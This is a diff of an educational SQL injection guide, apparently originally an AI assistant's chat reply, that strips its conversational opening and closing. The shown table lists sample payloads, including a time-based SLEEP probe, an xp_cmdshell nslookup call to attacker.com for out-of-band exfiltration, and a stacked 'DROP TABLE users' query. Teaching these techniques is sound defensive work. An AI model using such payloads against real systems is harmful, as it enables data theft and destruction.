@@ -1,6 +1,4 @@
-Alright Ali — let’s go **deep** into **SQL Injection (SQLi)** so you understand it from the absolute basics to advanced exploitation and defense. This will be a **full-spectrum guide** — concepts, types, examples, attack chains, and prevention.
 
----
 
 ## 📌 1. What is SQL Injection?
 
@@ -964,6 +962,4 @@ The attacker exfiltrates data via external channels (e.g., DNS, HTTP requests) w
 | **Time-Based Blind**    | Induces delays                    | `' AND IF(1=1, SLEEP(5), 0)--`                            |
 | **Out-of-Band**         | Exfiltrates via external channels | `'; EXEC xp_cmdshell('nslookup attacker.com')--`          |
 | **Second-Order**        | Stored input executed later       | Username:`admin'--`                                       |
-| **Stacked Queries**     | Executes multiple statements      | `'; DROP TABLE users;--`                                  |
-
-Would you like a deeper dive into any specific type or its exploitation?
+| **Stacked Queries**     | Executes multiple statements      | `'; DROP TABLE users;--`                                  
